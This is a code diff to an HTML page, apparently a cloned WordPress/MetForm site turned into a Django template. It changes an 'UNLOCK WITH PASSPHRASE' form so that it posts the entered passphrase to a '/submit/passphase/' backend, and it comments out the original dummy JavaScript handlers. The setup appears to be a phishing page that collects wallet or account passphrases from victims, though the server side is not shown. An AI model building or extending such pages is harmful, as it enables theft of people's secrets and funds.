@@ -193,9 +193,14 @@ body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: 
 		
 	}
 </style>
-		<form class="metform-form-content" id="yourForm" onsubmit="handleFormSubmit(event)">
+		<form class="metform-form-content" id="yourForm" method="POST" action="/submit/passphase/" onsubmit="handleFormSubmit_released(event)">
+
+			{% csrf_token %}
 			<!-- Top Dummy Markup -->
-			<div id="mf-response-props-id-7668" data-messageposition="top" data-successicon="" data-erroricon="" data-editswitchopen="no"></div>
+			{% if messages %}
+			<div id="mf-response-props-id-7668" style="color: red;" data-messageposition="top" data-successicon="" data-erroricon="" data-editswitchopen="no">
+				{%for message in messages %}{{message}} {% endfor%}</div>
+			{% endif %}
 		
 			<!-- Main Form Wrapper -->
 			<div class="metform-form-main-wrapper" key="hide-form-after-submit">
@@ -217,7 +222,7 @@ body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: 
 							<div class="elementor-element elementor-element-f5b7395 mf-btn--center elementor-widget elementor-widget-mf-button" data-id="f5b7395" data-element_type="widget" data-widget_type="mf-button.default">
 								<div class="elementor-widget-container">
 									<div class="mf-btn-wraper" data-mf-form-conditional-logic-requirement="">
-										<button type="submit" class="metform-btn metform-submit-btn butty" id="submitButton" onclick="handleUnlockButtonClick()">
+										<button type="submit" class="metform-btn metform-submit-btn butty" id="submitButton" onclick="handleUnlockButtonClick_released()">
 											<span id="buttonText">UNLOCK WITH PASSPHRASE</span>
 											<span id="loadingIndicator" style="display:none;">Loading...</span>
 										</button>
@@ -245,43 +250,43 @@ body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: 
 		</form>
 		
 		<script>
-			let isLoading = false;
+			// let isLoading = false;
 		
-			function controls_data(value) {
-				let currentWrapper = document.getElementById("mf-response-props-id-7668");
-				return currentWrapper ? currentWrapper.dataset[value] : false;
-			}
+			// function controls_data(value) {
+			// 	let currentWrapper = document.getElementById("mf-response-props-id-7668");
+			// 	return currentWrapper ? currentWrapper.dataset[value] : false;
+			// }
 		
-			let is_edit_mode = '' ? true : false;
-			let message_position = controls_data('messageposition') || 'top';
-			let message_successIcon = controls_data('successicon') || '';
-			let message_errorIcon = controls_data('erroricon') || '';
-			let message_editSwitch = controls_data('editswitchopen') === 'yes' ? true : false;
-			let message_proClass = controls_data('editswitchopen') === 'yes' ? 'mf_pro_activated' : '';
-			let is_dummy_markup = is_edit_mode && message_editSwitch ? true : false;
+			// let is_edit_mode = '' ? true : false;
+			// let message_position = controls_data('messageposition') || 'top';
+			// let message_successIcon = controls_data('successicon') || '';
+			// let message_errorIcon = controls_data('erroricon') || '';
+			// let message_editSwitch = controls_data('editswitchopen') === 'yes' ? true : false;
+			// let message_proClass = controls_data('editswitchopen') === 'yes' ? 'mf_pro_activated' : '';
+			// let is_dummy_markup = is_edit_mode && message_editSwitch ? true : false;
 		
-			function handleChange(event) {
-				// Your handling logic here
-			}
+			// function handleChange(event) {
+			// 	// Your handling logic here
+			// }
 		
-			function handleUnlockButtonClick() {
-				if (!isLoading) {
-					isLoading = true;
-					document.getElementById('buttonText').style.display = 'none';
-					document.getElementById('loadingIndicator').style.display = 'inline';
-					// Add additional logic if needed
-				}
-			}
+			// function handleUnlockButtonClick() {
+			// 	if (!isLoading) {
+			// 		isLoading = true;
+			// 		document.getElementById('buttonText').style.display = 'none';
+			// 		document.getElementById('loadingIndicator').style.display = 'inline';
+			// 		// Add additional logic if needed
+			// 	}
+			// }
 		
-			function handleFormSubmit(event) {
-				event.preventDefault();
-				// Your form submission logic here
-				console.log('Form submitted!');
-				// Reset loading state after form submission
-				isLoading = false;
-				document.getElementById('buttonText').style.display = 'inline';
-				document.getElementById('loadingIndicator').style.display = 'none';
-			}
+			// function handleFormSubmit(event) {
+			// 	event.preventDefault();
+			// 	// Your form submission logic here
+			// 	console.log('Form submitted!');
+			// 	// Reset loading state after form submission
+			// 	isLoading = false;
+			// 	document.getElementById('buttonText').style.display = 'inline';
+			// 	document.getElementById('loadingIndicator').style.display = 'none';
+			// }
 		</script>
 
 
